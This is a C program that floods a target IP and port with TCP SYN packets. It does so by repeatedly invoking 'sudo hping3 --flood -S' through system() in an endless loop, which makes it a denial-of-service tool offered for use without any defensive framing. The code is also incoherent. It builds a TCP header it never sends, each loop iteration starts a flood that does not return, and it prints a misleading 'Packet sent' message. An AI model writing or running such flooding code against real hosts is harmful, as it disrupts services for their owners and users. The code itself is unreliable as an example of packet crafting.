#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>

#define MAX_PACKET_SIZE 4096

int main(int argc, char **argv) {
    char *dst_ip = argv[1];
    int dst_port = atoi(argv[2]);
    int packet_size = sizeof(struct iphdr) + sizeof(struct tcphdr);
    char packet[MAX_PACKET_SIZE];
    memset(packet, 0, MAX_PACKET_SIZE);

    struct sockaddr_in dest_addr;
    memset(&dest_addr, 0, sizeof(dest_addr));
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(dst_port);
    if (inet_pton(AF_INET, dst_ip, &dest_addr.sin_addr) != 1) {
        printf("Invalid IP address: %s\n", dst_ip);
        exit(EXIT_FAILURE);
    }

    struct tcphdr tcp;
    memset(&tcp, 0, sizeof(tcp));
    tcp.source = htons(12345);
    tcp.dest = htons(dst_port);
    tcp.seq = htonl(rand() % 900000000 + 100000000);
    tcp.doff = sizeof(tcp) / 4;
    tcp.syn = 1;

    while (1) {
        char command[1024];
        sprintf(command, "sudo hping3 --flood -S -p %d -d %d %s > /dev/null", dst_port, packet_size, dst_ip);
        if (system(command) == -1) {
            printf("Failed to send packet: %s\n", strerror(errno));
            exit(EXIT_FAILURE);
        }
        printf("Packet sent to %s:%d\n", dst_ip, dst_port);

        usleep(200000); // Wait 200 milliseconds between packets
    }

    return 0;
}
